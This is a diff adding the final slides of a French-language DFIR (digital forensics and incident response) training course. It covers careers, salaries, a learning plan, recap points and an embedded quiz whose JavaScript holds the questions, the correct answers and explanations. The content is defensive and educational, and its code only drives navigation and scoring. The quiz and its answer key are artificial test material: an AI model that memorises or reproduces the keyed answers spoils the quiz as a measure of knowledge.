+            <div class="step-txt"><strong>Junior DFIR / Analyste IR</strong><br><span style="color:rgba(240,232,255,.5);font-size:.78rem">Réponse incidents N1-N2, collecte artefacts, triage. Cibles : <span class="tag tag-y" style="padding:.1rem .35rem">Security+</span> <span class="tag tag-y" style="padding:.1rem .35rem">BTL1</span> <span class="tag tag-y" style="padding:.1rem .35rem">GCIH</span></span></div>
+          </div>
+          <div class="step">
+            <span class="step-num" style="background:rgba(255,215,0,.06);padding:.2rem .45rem;color:var(--yellow);min-width:3.5rem;text-align:center">AN 3-5</span>
+            <div class="step-txt"><strong>Analyste DFIR Senior</strong><br><span style="color:rgba(240,232,255,.5);font-size:.78rem">Forensics avancée, malware triage, lead IR. Cibles : <span class="tag tag-y" style="padding:.1rem .35rem">GCFE</span> <span class="tag tag-y" style="padding:.1rem .35rem">GCFA</span> <span class="tag tag-y" style="padding:.1rem .35rem">eCDFP</span></span></div>
+          </div>
+          <div class="step">
+            <span class="step-num" style="background:rgba(255,136,0,.07);padding:.2rem .45rem;color:var(--orange);min-width:3.5rem;text-align:center">AN 5-8</span>
+            <div class="step-txt"><strong>Expert DFIR / Reverse Engineering</strong><br><span style="color:rgba(240,232,255,.5);font-size:.78rem">Malware RE, threat intel, témoignage légal. Freelance : 750-1100€/j</span></div>
+          </div>
+          <div class="step">
+            <span class="step-num" style="background:rgba(255,68,102,.07);padding:.2rem .45rem;color:var(--red);min-width:3.5rem;text-align:center">AN 8+</span>
+            <div class="step-txt"><strong>DFIR Practice Lead / Expert judiciaire</strong><br><span style="color:rgba(240,232,255,.5);font-size:.78rem">Direction d'équipe, témoignage tribunal, fondation CERT privé</span></div>
+          </div>
+        </div>
+      </div>
+      <div class="card card-yellow">
+        <div class="blabel" style="color:rgba(255,215,0,.4)">Certifications par niveau</div>
+        <div class="tag-list">
+          <span class="tag tag-g">Security+ · Entrée</span>
+          <span class="tag tag-y">BTL1 · Pratique</span>
+          <span class="tag tag-y">GCIH · IR Handler</span>
+          <span class="tag tag-y">GCFE · Forensics Entry</span>
+          <span class="tag tag-y">GCFA · Forensics Advanced</span>
+          <span class="tag tag-o">eCDFP · eLearnSec</span>
+          <span class="tag tag-r">CHFI · CEH Forensics</span>
+          <span class="tag" style="border-color:rgba(170,68,255,.3);color:var(--purple)">CISSP · Management</span>
+        </div>
+      </div>
+    </div>
+    <div style="display:flex;flex-direction:column;gap:.65rem">
+      <div class="card">
+        <div class="blabel">Rémunérations</div>
+        <div class="hdiv">Europe · France</div>
+        <div style="display:flex;flex-direction:column;gap:.4rem;margin-bottom:.7rem">
+          <div style="display:flex;justify-content:space-between;padding:.4rem .6rem;border-left:2px solid rgba(170,68,255,.25);background:rgba(170,68,255,.03)"><span style="font-family:var(--mono);font-size:.7rem;color:rgba(240,232,255,.55)">Junior (0–2 ans)</span><span style="font-family:var(--display);font-weight:700;color:var(--purple)">38–52K€/an</span></div>
+          <div style="display:flex;justify-content:space-between;padding:.4rem .6rem;border-left:2px solid rgba(255,215,0,.25);background:rgba(255,215,0,.03)"><span style="font-family:var(--mono);font-size:.7rem;color:rgba(240,232,255,.55)">Senior (2–6 ans)</span><span style="font-family:var(--display);font-weight:700;color:var(--yellow)">55–80K€/an</span></div>
+          <div style="display:flex;justify-content:space-between;padding:.4rem .6rem;border-left:2px solid rgba(255,136,0,.25);background:rgba(255,136,0,.03)"><span style="font-family:var(--mono);font-size:.7rem;color:rgba(240,232,255,.55)">Expert (6+ ans)</span><span style="font-family:var(--display);font-weight:700;color:var(--orange)">80–120K€/an</span></div>
+          <div style="display:flex;justify-content:space-between;padding:.4rem .6rem;border-left:2px solid rgba(255,68,102,.25);background:rgba(255,68,102,.03)"><span style="font-family:var(--mono);font-size:.7rem;color:rgba(240,232,255,.55)">Freelance IR TJM</span><span style="font-family:var(--display);font-weight:700;color:var(--red)">700–1100€/j</span></div>
+        </div>
+        <div class="hdiv">Afrique Francophone</div>
+        <div class="arow"><span class="em">🌍</span><p>Profil <strong>extrêmement rare</strong> sur le continent. Les CSIRT nationaux (CI-CERT, GABONCERT, SENCSIRT), les grandes banques et les groupes industriels cherchent des experts DFIR locaux. <strong>Volatility + Autopsy sont 100% gratuits</strong> — la formation est accessible depuis l'Afrique. Les CTF Blue Team (CyberDefenders, BlueteamLabs) sont le meilleur tremplin. Les missions IR sur incidents graves se négocient à l'urgence — TJM exceptionnel possible.</p></div>
+      </div>
+      <div class="card card-blue">
+        <div class="blabel" style="color:rgba(68,136,255,.4)">Plan d'action pour débuter</div>
+        <ul class="bullets" style="gap:.35rem">
+          <li><strong>Semaine 1–4 :</strong> Lab Volatility 3 sur des dumps fournis (github.com/volatilityfoundation)</li>
+          <li><strong>Mois 2–3 :</strong> CyberDefenders — challenges forensics gratuits (BlueteamLabs)</li>
+          <li><strong>Mois 4–6 :</strong> Passer BTL1 (Security Blue Team, ~250€) — très pratique</li>
+          <li><strong>Mois 6–12 :</strong> Lab Autopsy + KAPE + Eric Zimmerman Tools — tous gratuits</li>
+          <li><strong>AN 2 :</strong> GCFE ou GCFA après 2 ans d'expérience terrain</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ■ SLIDE 10 · RÉCAP ── -->
+<div class="slide" data-index="10">
+  <div class="slide-tag">// Récap · DFIR</div>
+  <h2>Ce qu'il faut retenir</h2>
+  <div class="grid2">
+    <div style="display:flex;flex-direction:column;gap:.65rem">
+      <div class="card">
+        <div style="font-size:.62rem;letter-spacing:.2em;color:rgba(170,68,255,.4);margin-bottom:.7rem">✅ LES 5 RÉFLEXES DU FORENSICIEN</div>
+        <ul class="bullets">
+          <li class="ok"><strong>Ordre de volatilité</strong> — Toujours du plus volatile (RAM) au moins volatile (disque)</li>
+          <li class="ok"><strong>Ne jamais éteindre</strong> — Isoler réseau, dumper RAM, analyser. Dans cet ordre.</li>
+          <li class="ok"><strong>Hash partout</strong> — Chaque preuve est hashée avant et après. Intégrité inviolable.</li>
+          <li class="ok"><strong>Documenter en temps réel</strong> — Chaque action horodatée. La mémoire est faillible.</li>
+          <li class="ok"><strong>Centraliser les logs</strong> — Ce qui est dans le SIEM ne peut pas être effacé localement.</li>
+        </ul>
+      </div>
+      <div class="card card-red">
+        <div style="font-size:.62rem;letter-spacing:.2em;color:rgba(255,68,102,.4);margin-bottom:.7rem">⚠ LES 3 ERREURS QUI DÉTRUISENT UNE INVESTIGATION</div>
+        <ul class="bullets" style="gap:.35rem">
+          <li class="bad"><strong>Éteindre la machine</strong> — La RAM est perdue. Les connexions C2 disparaissent. Les clés de chiffrement évaporées.</li>
+          <li class="bad"><strong>Analyser sur l'original</strong> — Toujours travailler sur une copie forensique. L'original ne se touche qu'avec un write blocker.</li>
+          <li class="bad"><strong>Rebuilder avant d'investiguer</strong> — On détruit les preuves. Le patient zéro reste inconnu. L'attaquant reviendra.</li>
+        </ul>
+      </div>
+    </div>
+    <div style="display:flex;flex-direction:column;gap:.65rem">
+      <div class="card card-yellow">
+        <div style="font-size:.62rem;letter-spacing:.2em;color:rgba(255,215,0,.4);margin-bottom:.7rem">📚 RESSOURCES POUR PROGRESSER</div>
+        <ul class="bullets" style="gap:.35rem">
+          <li><strong>CyberDefenders</strong> — Labs DFIR réalistes gratuits · cyberdefenders.org</li>
+          <li><strong>Volatility Foundation</strong> — Samples de RAM + docs · volatilityfoundation.org</li>
+          <li><strong>Eric Zimmerman Tools</strong> — Suite complète Windows forensics · ericzimmerman.github.io</li>
+          <li><strong>13Cubed (YouTube)</strong> — Meilleures vidéos pédagogiques DFIR</li>
+          <li><strong>SANS FOR508</strong> — La formation de référence monde (avancée)</li>
+          <li><strong>NoMoreRansom</strong> — Identifier et déchiffrer les ransomwares · nomoreransom.org</li>
+        </ul>
+      </div>
+      <div class="card" style="border-color:rgba(170,68,255,.2)">
+        <div class="blabel">Les autres cours SooPHA Learn · Cyber</div>
+        <div style="display:flex;flex-wrap:wrap;gap:.35rem;margin-bottom:.8rem">
+          <span class="pill pill-green">🪪 IAM</span>
+          <span class="pill pill-blue">🔍 SOC</span>
+          <span class="pill pill-cyan">☁️ Cloud Sec</span>
+          <span class="pill pill-red">⚔️ Pentester</span>
+          <span class="pill pill-orange">🛡️ RSSI</span>
+          <span class="pill pill-yellow">⚖️ DPO</span>
+          <span class="pill pill-pink">🕵️ CTI</span>
+        </div>
+        <div class="terminal" style="font-size:.66rem">
+          <span class="term-prompt">// </span><span class="term-out">Le DFIR, c'est la criminalistique numérique.<br>L'attaquant a des heures d'avance.<br>Le forensicien a l'éternité pour trouver la vérité.</span>
+        </div>
+      </div>
+    </div>
+  </div>
+  <div style="margin-top:1rem;max-width:880px;width:100%;text-align:center">
+    <div class="gabon-bar" style="margin:0 auto"><span></span><span></span><span></span></div>
+    <div style="font-family:var(--mono);font-size:.6rem;color:rgba(170,68,255,.2);margin-top:.6rem;letter-spacing:.1em">SooPHA Learn × DFIR · Forensics & Incident Response × Afrique Francophone</div>
+  </div>
+</div>
+
+</div><!-- /slides -->
+
+<!-- QCM -->
+<div id="qcm-overlay">
+  <div class="qcm-box">
+    <div class="qcm-header">
+      <span class="qcm-label">// QCM — Vérification</span>
+      <span class="qcm-prog" id="qcm-prog"></span>
+    </div>
+    <div class="qcm-saving" id="qcm-saving">⏳ Sauvegarde en cours...</div>
+    <div class="qcm-question" id="qcm-question"></div>
+    <div class="qcm-options" id="qcm-options"></div>
+    <div class="qcm-feedback" id="qcm-feedback"></div>
+    <button class="qcm-btn" id="qcm-next-btn" onclick="closeQcmAndAdvance()">CONTINUER →</button>
+  </div>
+</div>
+
+<!-- COMPLETION -->
+<div id="completion-modal">
+  <div class="completion-box">
+    <div class="completion-icon" id="comp-icon">🏆</div>
+    <div class="completion-title" id="comp-title">Cours terminé !</div>
+    <div class="completion-score" id="comp-score">--%</div>
+    <div class="completion-sub" id="comp-sub"></div>
+    <div class="completion-saved">💾 Progression sauvegardée dans ton profil</div>
+    <div>
+      <a href="dashboard.html" class="completion-btn completion-btn-primary">← Dashboard</a>
+      <button class="completion-btn completion-btn-secondary" onclick="document.getElementById('completion-modal').classList.remove('show')">Revoir</button>
+    </div>
+  </div>
+</div>
+
+<!-- BOTTOMBAR -->
+<div id="bottombar">
+  <button class="nav-btn" id="prev-btn" onclick="navigate(-1)" disabled>← PRÉCÉDENT</button>
+  <div style="display:flex;align-items:center;gap:1.5rem">
+    <span class="qcm-indicator" id="qcm-ind"></span>
+    <span id="slide-counter">01 / 11</span>
+  </div>
+  <button class="nav-btn" id="next-btn" onclick="navigate(1)">SUIVANT →</button>
+</div>
+
+<script>
+/* ── QCM · Réponses distribuées : D · A · C · B · D · A · C · B ── */
+var QCM = {
+  1:{
+    question:"Selon la RFC 3227, dans quel ordre faut-il collecter les preuves numériques sur une machine compromise ?",
+    options:["Disque dur en premier car il contient le plus de données, puis la mémoire RAM, et enfin les logs réseau","Logs réseau en premier pour capturer le trafic en cours, puis le disque dur, puis la mémoire RAM","Rapport d'incident en premier pour documenter la situation avant toute manipulation de la machine","Du plus volatile au moins volatile : RAM et connexions actives en premier, puis le disque, puis les logs distants et sauvegardes — car les données volatiles disparaissent à l'extinction"],
+    correct:3,
+    explanation:"La RFC 3227 établit l'ordre de volatilité comme principe fondamental de la collecte forensique. La RAM contient des données qui disparaissent en secondes (connexions actives, clés de chiffrement, processus en cours, credentials en mémoire). Le disque persiste des jours, les logs distants des semaines. Inverser cet ordre, c'est détruire des preuves irremplaçables avant même de les avoir vues."
+  },
+  2:{
+    question:"Qu'est-ce que la 'chaîne de custody' en forensics numérique, et pourquoi est-elle indispensable ?",
+    options:["C'est la documentation complète de qui a manipulé chaque preuve numérique, quand et comment — garantissant l'intégrité de la preuve et sa recevabilité devant un tribunal ou dans un rapport légal","C'est la liste chronologique des événements d'une attaque, utilisée pour identifier le patient zéro et reconstituer la kill chain de l'attaquant","C'est le processus automatique de sauvegarde des preuves numériques vers un cloud sécurisé pendant l'investigation forensique","C'est la séquence d'outils utilisés pendant l'analyse forensique, documentée pour permettre la reproductibilité des résultats par un autre analyste"],
+    correct:0,
+    explanation:"La chaîne de custody (chain of custody) est le registre qui documente chaque manipulation d'une preuve numérique : qui y a accédé, quand, pourquoi, et quelles actions ont été effectuées. Elle est garantie par les hashs cryptographiques (SHA-256) calculés avant et après chaque opération — si les hashs correspondent, la preuve n'a pas été altérée. Sans chaîne de custody rigoureuse, une preuve numérique peut être jugée irrecevable devant un tribunal, invalidant toute l'investigation."
+  },
+  3:{
+    question:"Un analyste DFIR arrive sur une machine Windows qui semble compromise et toujours allumée. L'EDR signale une injection active dans un processus. Quelle est la BONNE séquence d'actions ?",
+    options:["Éteindre immédiatement la machine pour stopper l'attaque, puis démarrer sur un live USB forensique pour analyser le disque","Redémarrer la machine en mode sans échec Windows pour isoler les processus suspects du reste du système","Isoler la machine du réseau (couper la NIC) sans l'éteindre, puis dumper la RAM en priorité, puis collecter les artefacts disque","Lancer un antivirus à jour sur la machine pour nettoyer les malwares avant de commencer l'analyse forensique"],
+    correct:2,
+    explanation:"La séquence correcte est : isoler réseau (couper la NIC ou via EDR) → dumper la RAM (DumpIt, WinPmem) → puis collecter les artefacts disque (KAPE). Éteindre (A) détruit la RAM irrémédiablement — connexions C2 actives, clés de chiffrement, processus injectés disparaissent. Redémarrer (B) est encore pire. Un antivirus (D) peut modifier les artefacts et invalide la chaîne de custody. L'isolation réseau coupe la communication C2 sans détruire les preuves volatiles."
+  },
+  4:{
+    question:"Dans Volatility 3, quelle commande permet de détecter les injections de code dans les processus Windows (process hollowing, DLL injection) ?",
+    options:["windows.pslist — qui liste tous les processus avec leur PID, PPID et temps de création pour identifier les processus orphelins","windows.malfind — qui scanne les régions mémoire à la recherche de code avec des permissions RWX inhabituelles ou des en-têtes PE dans des zones non-mappées","windows.netstat — qui affiche toutes les connexions réseau actives au moment du dump pour identifier les communications C2","windows.dumpfiles — qui extrait les fichiers ouverts par chaque processus pour les analyser avec un antivirus hors ligne"],
+    correct:1,
+    explanation:"windows.malfind est le plugin Volatility dédié à la détection d'injections. Il recherche les régions mémoire avec des permissions Read-Write-Execute (RWX) — inhabituelles dans un process légitime — ou des en-têtes PE (MZ) dans des zones qui ne devraient pas contenir d'exécutables. C'est la signature classique du process hollowing (remplacement du code légitime) et de la DLL injection. windows.pslist aide à identifier les parents suspects, mais malfind est l'outil d'analyse d'injection."
+  },
+  5:{
+    question:"Un analyste forensique analyse les logs Windows Event d'une machine post-incident et trouve l'Event ID 1102. Que signifie-t-il et quelle est son implication ?",
+    options:["Event 1102 indique qu'un nouveau service Windows a été installé — signe classique de persistence après une compromission initiale","Event 1102 signale une tentative d'authentification échouée depuis le réseau — indicateur de mouvement latéral par brute force","Event 1102 indique un script PowerShell exécuté avec le ScriptBlock logging activé — révélant les commandes PowerShell de l'attaquant","Event 1102 signifie que le journal d'audit a été effacé — c'est une tentative d'anti-forensics de l'attaquant pour couvrir ses traces, et sa présence confirme une activité malveillante"],
+    correct:3,
+    explanation:"L'Event ID 1102 'The audit log was cleared' est l'un des Event IDs les plus critiques en DFIR. Il signifie que quelqu'un a volontairement effacé les journaux d'audit Windows — une technique d'anti-forensics classique pour effacer les traces d'une compromission. Sa simple présence dans les logs est ironiquement une preuve d'activité malveillante. En comparaison : 4698 = tâche planifiée créée (persistence), 7045 = service installé (persistence), 4104 = PowerShell ScriptBlock, 4625 = échec auth."
+  },
+  6:{
+    question:"Lors d'un incident ransomware en cours, la direction demande de payer la rançon immédiatement pour récupérer les données. Quelle est la position correcte d'un expert DFIR ?",
+    options:["Recommander le paiement si le montant est inférieur au coût estimé de la reconstruction — c'est une décision business rationnelle qui relève de la direction","Recommander fermement de NE PAS payer : aucune garantie de déchiffrement, financement d'un groupe criminel, risque de double extorsion et de récidive. Investiguer d'abord, reconstruire depuis les backups","Suspendre toute décision jusqu'à ce que Europol ou le FBI ait été contacté, car le paiement de rançon est illégal dans tous les pays européens","Payer uniquement si le ransomware est identifié comme un groupe APT étatique, car les groupes criminels classiques ne fournissent jamais les clés de déchiffrement"],
+    correct:1,
+    explanation:"La position unanime des experts DFIR, des agences (ANSSI, FBI, ENISA) et des assureurs est de ne pas payer. Les raisons : (1) Aucune garantie que les données seront restituées — environ 30% des victimes ne reçoivent jamais les clés. (2) La double extorsion est devenue la norme — l'attaquant a déjà exfiltré les données et peut les revendre. (3) Le paiement finance les groupes criminels et motive de nouvelles attaques. (4) Payer inscrit l'organisation sur une liste de 'payeurs' — cible privilégiée pour de futures attaques. La priorité doit être d'investiguer, contenir et reconstruire depuis des backups immuables."
+  },
+  7:{
+    question:"Velociraptor se distingue des outils forensiques traditionnels (Volatility, Autopsy) par quelle capacité principale ?",
+    options:["Sa capacité à analyser les images mémoire RAM offline beaucoup plus rapidement que Volatility grâce à son moteur de requête optimisé","Sa capacité à interroger simultanément des milliers de machines en temps réel via un agent léger, permettant de trouver le patient zéro sur tout un parc en quelques minutes","Sa capacité à reconstituer graphiquement la kill chain complète d'une attaque à partir des artefacts disque, en intégrant automatiquement la matrice MITRE ATT&CK","Sa capacité à analyser les fichiers PCAP réseau et à extraire automatiquement les indicateurs de compromission (IP, domaines C2, fichiers transférés)"],
+    correct:1,
+    explanation:"Velociraptor est une plateforme de DFIR distribuée : un agent léger est déployé sur chaque endpoint et peut être interrogé en temps réel via VQL (Velociraptor Query Language). Au lieu d'analyser manuellement chaque machine une par une, l'analyste peut envoyer une requête à 10 000 machines simultanément et recevoir les résultats en quelques minutes. C'est ce qui le distingue fondamentalement des outils offline comme Volatility (analyse de RAM) ou Autopsy (analyse de disque), qui nécessitent d'abord une acquisition locale."
+  },
+  8:{
+    question:"Un attaquant modifie les timestamps MACB (Modified, Accessed, Changed, Born) des fichiers malveillants pour qu'ils semblent avoir été créés avant l'incident. Comment appelle-t-on cette technique, et comment la contrer ?",
+    options:["Cette technique s'appelle le 'Log poisoning' — on la contrecarre en comparant les timestamps des logs applicatifs avec ceux du système de fichiers","Cette technique s'appelle le 'Timestomping' — on la contrecarre en comparant les timestamps du $MFT (qui stocke les dates NTFS internes) avec ceux des autres artefacts comme le Prefetch, les Event Logs et les logs SIEM centralisés","Cette technique s'appelle le 'File Shadowing' — on la contrecarre en restaurant les Volume Shadow Copies (VSS) qui conservent les versions originales des fichiers","Cette technique s'appelle l'Anti-forensics actif — on la contrecarre en recalculant les hashs MD5 de tous les fichiers suspects pour détecter les modifications de contenu"],
+    correct:1,
+    explanation:"Le Timestomping consiste à modifier les timestamps MACB (Modification, Access, Change/MFT Entry Changed, Birth/Creation) visibles dans l'Explorateur Windows pour induire l'analyste en erreur sur la chronologie. La contre-mesure est de croiser plusieurs sources : le $MFT NTFS (qui stocke des timestamps $STANDARD_INFORMATION et $FILE_NAME parfois différents), le Prefetch (qui enregistre la première et dernière exécution), les Event Logs Windows (horodatés indépendamment), et surtout les logs centralisés dans le SIEM — qui ne peuvent pas être modifiés localement après coup."
+  }
+};
+
+var COURSE_ID="dfir-complet",TOTAL=11,current=0,currentUser=null;
+var qcmAnswered={},qcmScores={},currentQcmSlide=null;
+
+function updateUI(){
+  document.getElementById("slide-counter").textContent=String(current+1).padStart(2,"0")+" / "+String(TOTAL).padStart(2,"0");
+  document.getElementById("prev-btn").disabled=current===0;
+  document.getElementById("next-btn").disabled=current===TOTAL-1;
+  document.getElementById("progress-fill").style.width=((current+1)/TOTAL*100)+"%";
+  var ind=document.getElementById("qcm-ind");
+  if(QCM[current])ind.textContent=qcmAnswered[current]?(qcmScores[current]===1?"✅ QCM répondu":"❌ QCM répondu"):"⚡ QCM requis";
+  else ind.textContent="";
+}
+function navigate(dir){
+  var next=current+dir;
+  if(next<0||next>=TOTAL)return;
+  if(dir>0&&QCM[current]&&!qcmAnswered[current]){showQcm(current);return;}
+  var curEl=document.querySelector(".slide.active"),nextEl=document.querySelector(".slide[data-index='"+next+"']");
+  curEl.classList.remove("active");curEl.classList.add("exit");
+  setTimeout(function(){curEl.classList.remove("exit");},400);
+  nextEl.classList.add("active");current=next;updateUI();
+}
+function showQcm(idx){
+  var qcm=QCM[idx];if(!qcm)return;
+  currentQcmSlide=idx;
+  document.getElementById("qcm-prog").textContent="QCM "+(Object.keys(qcmAnswered).length+1)+" / "+Object.keys(QCM).length;
+  document.getElementById("qcm-question").textContent=qcm.question;
+  document.getElementById("qcm-feedback").style.display="none";
+  document.getElementById("qcm-feedback").className="qcm-feedback";
+  document.getElementById("qcm-next-btn").classList.remove("show");
+  document.getElementById("qcm-saving").classList.remove("show");
+  var letters=["A","B","C","D"],html="";
+  qcm.options.forEach(function(opt,i){html+='<div class="qcm-option" onclick="selectOption(this,'+i+')"><span class="option-letter">'+letters[i]+"</span>"+opt+"</div>";});
+  document.getElementById("qcm-options").innerHTML=html;
+  if(qcmAnswered[idx]){restoreQcmState(idx);document.getElementById("qcm-next-btn").classList.add("show");}
+  document.getElementById("qcm-overlay").classList.add("show");
+}
+function selectOption(el,optIdx){
+  if(qcmAnswered[currentQcmSlide])return;
+  var qcm=QCM[currentQcmSlide],correct=optIdx===qcm.correct;
+  document.querySelectorAll(".qcm-option").forEach(function(o,i){o.classList.add("disabled");if(i===qcm.correct)o.classList.add("correct");});
+  if(!correct)el.classList.add("wrong");
+  var fb=document.getElementById("qcm-feedback");
+  fb.style.display="block";fb.className="qcm-feedback "+(correct?"correct":"wrong");
+  fb.textContent=(correct?"✅ Correct ! ":"❌ Incorrect. ")+qcm.explanation;
+  qcmAnswered[currentQcmSlide]=true;qcmScores[currentQcmSlide]=correct?1:0;updateUI();
+  if(Object.keys(qcmAnswered).length===Object.keys(QCM).length){
+    var tot=Object.keys(QCM).length,c=Object.values(qcmScores).filter(function(v){return v===1;}).length;
+    setTimeout(function(){closeQcmAndAdvance();showCompletion((c/tot)*100);},1400);return;
+  }
+  document.getElementById("qcm-next-btn").classList.add("show");
+}
+function restoreQcmState(idx){
+  var qcm=QCM[idx],score=qcmScores[idx];
+  document.querySelectorAll(".qcm-option").forEach(function(o,i){o.classList.add("disabled");if(i===qcm.correct)o.classList.add("correct");});
+  var fb=document.getElementById("qcm-feedback");
+  fb.style.display="block";fb.className="qcm-feedback "+(score===1?"correct":"wrong");
+  fb.textContent=(score===1?"✅ Déjà répondu correctement. ":"❌ Réponse incorrecte. ")+qcm.explanation;
+}
+function closeQcmAndAdvance(){
+  document.getElementById("qcm-overlay").classList.remove("show");
+  if(currentQcmSlide===current&&current<TOTAL-1){
+    var next=current+1,curEl=document.querySelector(".slide.active"),nextEl=document.querySelector(".slide[data-index='"+next+"']");
+    curEl.classList.remove("active");curEl.classList.add("exit");
+    setTimeout(function(){curEl.classList.remove("exit");},400);
+    nextEl.classList.add("active");current=next;updateUI();
+  }
+}
+function showCompletion(pct){
+  var tot=Object.keys(QCM).length,c=Object.values(qcmScores).filter(function(v){return v===1;}).length;
+  document.getElementById("comp-score").textContent=Math.round(pct)+"%";
+  if(pct>=75){document.getElementById("comp-icon").textContent="🏆";document.getElementById("comp-title").textContent="Excellent !";document.getElementById("comp-sub").textContent=c+" / "+tot+" bonnes réponses. DFIR maîtrisé !";}
+  else if(pct>=50){document.getElementById("comp-icon").textContent="📚";document.getElementById("comp-title").textContent="Bien joué !";document.getElementById("comp-sub").textContent=c+" / "+tot+" bonnes réponses. Quelques notions à revoir.";}
+  else{document.getElementById("comp-icon").textContent="🔁";document.getElementById("comp-title").textContent="À revoir";document.getElementById("comp-sub").textContent=c+" / "+tot+" bonnes réponses. Recommence le cours !";}
+  document.getElementById("completion-modal").classList.add("show");
+}
+document.addEventListener("keydown",function(e){
+  if(document.getElementById("qcm-overlay").classList.contains("show"))return;
+  if(e.key==="ArrowRight"||e.key===" "){e.preventDefault();navigate(1);}
+  if(e.key==="ArrowLeft")navigate(-1);
+});
+var touchX=0;
+document.addEventListener("touchstart",function(e){touchX=e.touches[0].clientX;});
+document.addEventListener("touchend",function(e){var dx=e.changedTouches[0].clientX-touchX;if(Math.abs(dx)>50&&!document.getElementById("qcm-overlay").classList.contains("show"))navigate(dx<0?1:-1);});
+(function(){
+  var c=document.getElementById("matrix"),ctx=c.getContext("2d");
+  function resize(){c.width=window.innerWidth;c.height=window.innerHeight;}resize();window.addEventListener("resize",resize);
+  var chars="DFIRFORENSICSVOLATILITYAUTOPSYMALWARE01",fs=13,drops;
+  function initDrops(){drops=Array(Math.floor(c.width/fs)).fill(1);}initDrops();window.addEventListener("resize",initDrops);
+  setInterval(function(){
+    ctx.fillStyle="rgba(6,2,14,0.05)";ctx.fillRect(0,0,c.width,c.height);
+    ctx.fillStyle="#aa44ff";ctx.font=fs+"px monospace";
+    drops.forEach(function(y,i){ctx.fillText(chars[Math.floor(Math.random()*chars.length)],i*fs,y*fs);if(y*fs>c.height&&Math.random()>.975)drops[i]=0;drops[i]++;});
+  },55);
+})();
+updateUI();
+</script>
+</body>
+</html>
